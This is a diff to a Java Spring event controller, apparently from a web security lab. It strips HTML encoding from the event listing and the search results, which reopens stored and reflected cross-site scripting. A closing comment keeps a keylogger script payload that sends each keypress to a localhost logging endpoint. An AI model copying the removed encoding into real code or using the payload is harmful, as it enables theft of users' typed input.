@@ -30,9 +30,7 @@ public class EventController {
     @GetMapping
     public String getAllEvents(Model model) {
         List<EventModel> events = eventService.findAll();
-        List<EventModel> sEventModels = new ArrayList<>();
-        events.forEach(e -> sEventModels.add(encodeEvent(e)));
-        model.addAttribute("events", sEventModels);
+        model.addAttribute("events", events);
         model.addAttribute("message", "Showing all events");
         model.addAttribute("pageTitle", "Events");
         return "events";
@@ -57,7 +55,9 @@ public class EventController {
 
     @GetMapping("/edit/{id}")
     public String showEditEventForm(@PathVariable String id, Model model) {
-        EventModel event = eventService.findById(id);
+        String eID = Encode.forHtml(id);
+
+        EventModel event = eventService.findById(eID);
         model.addAttribute("event", event);
         return "edit-event";
     }
@@ -65,7 +65,7 @@ public class EventController {
     @PostMapping("/edit/{id}")
     public String updateEvent(@PathVariable String id, @ModelAttribute EventModel event, Model model) {
         String eID = Encode.forHtml(id);
-        
+
         EventModel updatedEvent = eventService.updateEvent(eID, event);
         model.addAttribute("event", updatedEvent);
         return "redirect:/events";
@@ -79,29 +79,29 @@ public class EventController {
     }
 
     // EventController.java (part of the existing file)
-@GetMapping("/search")
-public String searchForm(Model model) {
-    model.addAttribute("eventSearch", new EventSearch());
-    return "searchForm";
-}
-
-@PostMapping("/search")
-public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResult result, Model model) {
-    if (result.hasErrors()) {
+    @GetMapping("/search")
+    public String searchForm(Model model) {
+        model.addAttribute("eventSearch", new EventSearch());
         return "searchForm";
     }
-    String s = encodeString(eventSearch.getSearchString());
-    List<EventModel> events = eventService.findByDescription(s);
-    model.addAttribute("message", "Search results for " + eventSearch.getSearchString());
-    model.addAttribute("events", events);
-    return "events";
-}
 
-    private EventModel encodeEvent(EventModel event){
+    @PostMapping("/search")
+    public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResult result, Model model) {
+        if (result.hasErrors()) {
+            return "searchForm";
+        }
+        //String s = encodeString(eventSearch.getSearchString());
+        List<EventModel> events = eventService.findByDescription(eventSearch.getSearchString());
+        model.addAttribute("message", "Search results for " + eventSearch.getSearchString());
+        model.addAttribute("events", events);
+        return "events";
+    }
+
+    private EventModel encodeEvent(EventModel event) {
         EventModel secure = new EventModel();
 
         secure.setDescription(encodeString(event.getDescription()));
-        if(event.getId() != null)
+        if (event.getId() != null)
             secure.setId(encodeString(event.getId()));
         secure.setLocation(encodeString(event.getLocation()));
         secure.setName(encodeString(event.getName()));
@@ -111,7 +111,7 @@ public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResu
         return secure;
     }
 
-    private String encodeString(String event){
+    private String encodeString(String event) {
 
         return Encode.forHtml(event);
     }
@@ -119,31 +119,31 @@ public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResu
 
 /*
  * 
-<script>
-document.addEventListener('keypress', function(evt) {
-  var key = evt.key;  
+  <script>
+  document.addEventListener(\'keypress\', function(evt) {
+  var key = evt.key;
   if (key) {
-    var param = encodeURIComponent(key);
-    var url = "http://localhost:8081/logKey?key=" + param;
-
-    fetch(url, {
-      method: 'GET'
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Network response was not ok');
-      }
-      return response.text();
-    })
-    .then(data => {
-      console.log('Key logged:', data);
-    })
-    .catch(error => {
-      console.error('There was a problem with the fetch operation:', error);
-    });
+  var param = encodeURIComponent(key);
+  var url = "http://localhost:8081/logKey?key=" + param;
+  
+  fetch(url, {
+  method: \'GET\'
+  })
+  .then(response => {
+  if (!response.ok) {
+  throw new Error(\'Network response was not ok\');
   }
-});
-
-</script>
-
+  return response.text();
+  })
+  .then(data => {
+  console.log(\'Key logged:\', data);
+  })
+  .catch(error => {
+  console.error(\'There was a problem with the fetch operation:\', error);
+  });
+  }
+  });
+  
+  </script>
+  
  */
